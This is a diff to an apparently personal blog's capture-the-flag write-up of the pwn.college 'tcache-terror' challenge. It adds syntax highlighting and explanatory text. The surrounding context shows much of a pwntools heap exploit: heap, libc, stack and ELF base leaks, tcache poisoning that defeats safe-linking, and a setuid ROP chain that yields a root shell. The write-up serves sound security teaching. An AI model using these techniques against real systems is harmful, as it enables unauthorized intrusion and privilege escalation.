@@ -12,6 +12,11 @@
   <link rel="manifest" href="../assets/site.webmanifest">
 
   <link rel="stylesheet" href="../assets/css/main.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+  <style>
+    .entry-content pre { background: transparent; padding: 0; border: none; }
+    .hljs { border-radius: 6px; border: 1px solid var(--border); padding: 1rem 1.25rem; display: block; overflow-x: auto; font-size: 0.85rem; }
+  </style>
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -67,7 +72,7 @@
           challenge, with hardcoded library paths. To debug locally with GDB, I need to mirror
           that layout exactly.
         </p>
-        <pre><code># Pull the binary, libc, and loader from the remote dojo
+        <pre><code class="language-bash"># Pull the binary, libc, and loader from the remote dojo
 scp hacker@dojo.pwn.college:/challenge/tcache-terror-easy .
 scp hacker@dojo.pwn.college:/challenge/lib/libc.so.6 .
 scp hacker@dojo.pwn.college:/challenge/lib/ld-linux-x86-64.so.2 .
@@ -80,7 +85,7 @@ sudo ln -s $(pwd)/ld-linux-x86-64.so.2 /challenge/lib/ld-linux-x86-64.so.2</code
         <h2>Recon</h2>
 
         <h3>Checksec</h3>
-        <pre><code>pwndbg> checksec
+        <pre><code class="language-plaintext">pwndbg> checksec
 File:     /home/storage/co3lho22/pwn.college/tcache-terror-easy
 Arch:     amd64
 RELRO:      Full RELRO
@@ -98,12 +103,30 @@ Stripped:   No</code></pre>
           which helps when computing libc offsets.
         </p>
 
+        <h3>Reverse Engineering</h3>
+        <p>
+          The binary exposes a text-based allocator interface over stdin. The main loop reads
+          a command string and dispatches to one of five handlers: <code>malloc</code>,
+          <code>free</code>, <code>safe_write</code>, <code>safe_read</code>, and <code>quit</code>.
+          Each command takes an index into a global chunk array and, for malloc, a size argument.
+        </p>
+        <p>
+          <!-- Add disassembly screenshots or Ghidra/IDA decompiler snippets here -->
+          <!-- Key things to show: the chunk array, the overflow in safe_read/safe_write, the absence of a win function -->
+        </p>
+        <p>
+          The first thing I checked was whether there was a win function or any code path that
+          reads a flag file. There isn't — the binary is a pure allocator harness. The objective
+          is a shell, not a read.
+        </p>
+
         <h3>Primitives</h3>
         <p>
-          The binary exposes a text-based allocator interface: <code>malloc</code>, <code>free</code>,
-          <code>safe_write</code>, and <code>safe_read</code>. The vulnerability is a
-          <strong>0x10-byte overflow</strong> on each chunk operation — enough to reach the
-          next contiguous chunk's <code>chunk_size</code> field and its <code>fd</code> pointer.
+          The key vulnerability: <code>safe_read</code> and <code>safe_write</code> operate on
+          <code>chunk_size + 0x10</code> bytes — 0x10 bytes more than the allocated region.
+          On a 24-byte chunk (<code>0x18</code>), this reaches <code>0x28</code> bytes into
+          the data, which overflows into the next contiguous chunk's <code>prev_size</code> and
+          <code>chunk_size</code> fields, and — critically — its <code>fd</code> pointer.
           Controlling the <code>fd</code> pointer of a freed tcache chunk is the tcache poison primitive.
         </p>
 
@@ -136,7 +159,7 @@ Stripped:   No</code></pre>
           <code>fd</code> is just <code>chunk_addr &gt;&gt; 12</code> — a recoverable heap address.
           Reading it back after a malloc/free/malloc cycle leaks the heap base.
         </p>
-        <pre><code># Chunks 0 and 1 are allocated early — they'll be used as the overflow source later
+        <pre><code class="language-python"># Chunks 0 and 1 are allocated early — they'll be used as the overflow source later
 io.sendline(b"malloc 0 24")
 io.sendline(b"malloc 1 24")
 
@@ -148,7 +171,7 @@ io.sendline(b"safe_write 2")
 
 leak = io.recv(8)
 heap_base = u64(leak) &lt;&lt; 12    # undo the right-shift</code></pre>
-        <pre><code>[+] heap_base: 0x55f8a2400000</code></pre>
+        <pre><code class="language-plaintext">[+] heap_base: 0x55f8a2400000</code></pre>
         <p>
           With the heap base known, we can compute the safe-linking key used in future
           tcache poison steps: <code>key = heap_base &gt;&gt; 12</code>.
@@ -166,7 +189,7 @@ heap_base = u64(leak) &lt;&lt; 12    # undo the right-shift</code></pre>
           coalesces the freed large chunk back into the top chunk instead of putting it
           in the unsorted bin, and there's nothing to read.
         </p>
-        <pre><code>io.sendline(b"malloc 10 1048")   # large chunk — goes to unsorted bin on free
+        <pre><code class="language-python">io.sendline(b"malloc 10 1048")   # large chunk — goes to unsorted bin on free
 io.sendline(b"malloc 3 24")       # guard chunk — blocks coalescing with top chunk
 io.sendline(b"free 10")
 io.sendline(b"malloc 10 1048")    # reallocate — unsorted bin fd is now in the data region
@@ -174,7 +197,7 @@ io.sendline(b"safe_write 10")
 
 leak = io.recv(8)
 libc.address = u64(leak) - 0x219ce0    # known offset from arena pointer to libc base</code></pre>
-        <pre><code>[+] libc address: 0x7f3c8a200000
+        <pre><code class="language-plaintext">[+] libc address: 0x7f3c8a200000
 [+] libc.environ: 0x7f3c8a419e40</code></pre>
         <p>
           With libc resolved, <code>libc.environ</code> — the address of the environment
@@ -194,7 +217,7 @@ libc.address = u64(leak) - 0x219ce0    # known offset from arena pointer to libc
           <code>mangled = target ^ (heap_base &gt;&gt; 12)</code>. The next two allocations of
           the same size return first the poisoned chunk, then the forged address.
         </p>
-        <pre><code># Free chunks 2 and 1 — order matters: 1 must be freed last so it's at the tcache head
+        <pre><code class="language-python"># Free chunks 2 and 1 — order matters: 1 must be freed last so it's at the tcache head
 io.sendline(b"free 2")
 io.sendline(b"free 1")
 
@@ -216,7 +239,7 @@ io.sendline(b"safe_write 2")
 
 stack_address = u64(io.recv(8))
 ret_address = stack_address - 0x120</code></pre>
-        <pre><code>[+] stack_address (environ): 0x7ffe928bf5a8
+        <pre><code class="language-plaintext">[+] stack_address (environ): 0x7ffe928bf5a8
 [+] ret_address: 0x7ffe928bf488</code></pre>
         <p>
           The offset <code>-0x120</code> was determined by comparing <code>libc.environ</code>
@@ -226,7 +249,7 @@ ret_address = stack_address - 0x120</code></pre>
           <code>ret</code>) aligns the write perfectly: <code>p64(0x0)</code> lands on the saved
           rbp, and the payload chain starts exactly at the return address.
         </p>
-        <pre><code>rbp_address = ret_address - 0x8</code></pre>
+        <pre><code class="language-python">rbp_address = ret_address - 0x8</code></pre>
 
         <h2>Phase 4 — ELF Base Leak</h2>
         <p>
@@ -236,7 +259,7 @@ ret_address = stack_address - 0x120</code></pre>
           minus a static offset found by disassembly, gives the ELF base and validates
           that PIE randomization is correctly accounted for.
         </p>
-        <pre><code># Fresh set of chunks at size 72 for the second poison
+        <pre><code class="language-python"># Fresh set of chunks at size 72 for the second poison
 io.sendline(b"malloc 0 72")
 io.sendline(b"malloc 1 72")
 io.sendline(b"malloc 2 72")
@@ -261,7 +284,7 @@ io.recv(8 * 3)    # skip: saved rbp, saved rsp, __libc_start_call_main return st
 leak = io.recv(8)
 main_address = u64(leak)
 elf.address = main_address - 0x1957</code></pre>
-        <pre><code>[+] main_address: 0x55f8a1601957
+        <pre><code class="language-plaintext">[+] main_address: 0x55f8a1601957
 [+] elf.address: 0x55f8a1600000
 [+] libc system: 0x7f3c8a248d60</code></pre>
         <p>
@@ -284,7 +307,7 @@ elf.address = main_address - 0x1957</code></pre>
           pwntools at the libc object (already rebased after the leak) gives direct access to
           <code>pop rdi</code>, <code>pop rsi</code>, and everything else needed.
         </p>
-        <pre><code>rop = ROP(libc)
+        <pre><code class="language-python">rop = ROP(libc)
 
 rop.raw(rop.rdi)
 rop.raw(0)                              # ruid = 0
@@ -301,19 +324,26 @@ io.send(p64(0x0) + rop.chain())
 
 # trigger: main() returns, walks the chain
 io.sendline(b"quit")</code></pre>
-        <pre><code>[*] Switching to interactive mode
+        <pre><code class="language-plaintext">[*] Switching to interactive mode
 $ id
 uid=0(root) gid=0(root) groups=0(root)</code></pre>
 
         <h2>Hard Variant</h2>
         <p>
-          The hard variant uses the same binary logic and the same exploit. The only difference
-          is in how <code>safe_write</code> formats its output: the easy version terminates with
-          <code>)\n</code> (<code>\x29\x0a</code>), while the hard version terminates with
-          <code> \n</code> (<code>\x20\x0a</code>). Every <code>recvuntil</code> call before
-          reading a leak needed to match that byte.
+          There are two differences between easy and hard. The first is structural: the easy
+          version prints helper leak values directly in its output (addresses handed to you in
+          plaintext). The hard version removes those. I deliberately ignored the easy leaks
+          entirely and built the exploit from scratch without relying on them — otherwise the
+          easy exploit simply wouldn't port to hard, and I'd have to redo the whole thing.
+          By treating both the same from the start, adapting to hard required almost no changes.
         </p>
-        <pre><code># easy
+        <p>
+          The second difference is a single output byte: <code>safe_write</code> in the easy
+          version terminates its output with <code>)\n</code> (<code>\x29\x0a</code>); the hard
+          version uses <code> \n</code> (<code>\x20\x0a</code>). Every <code>recvuntil</code>
+          call before reading a leak needed to match that terminator.
+        </p>
+        <pre><code class="language-python"># easy
 io.recvuntil(b"\x29\x0a")
 
 # hard
@@ -327,7 +357,7 @@ io.recvuntil(b"\x20\x0a")</code></pre>
         <h2>Full Scripts</h2>
 
         <h3>Easy</h3>
-        <pre><code>#!/usr/bin/python3
+        <pre><code class="language-python">#!/usr/bin/python3
 from pwn import *
 
 elf = context.binary = ELF("./tcache-terror-easy")
@@ -457,7 +487,7 @@ io.sendline(b"quit")
 io.interactive()</code></pre>
 
         <h3>Hard (diff from easy)</h3>
-        <pre><code># Replace every occurrence of:
+        <pre><code class="language-python"># Replace every occurrence of:
 io.recvuntil(b"\x29\x0a")
 # with:
 io.recvuntil(b"\x20\x0a")</code></pre>
@@ -474,6 +504,8 @@ io.recvuntil(b"\x20\x0a")</code></pre>
 
   </div>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
   <script src="../assets/js/theme.js"></script>
   <script src="../assets/js/main.js"></script>
 </body>
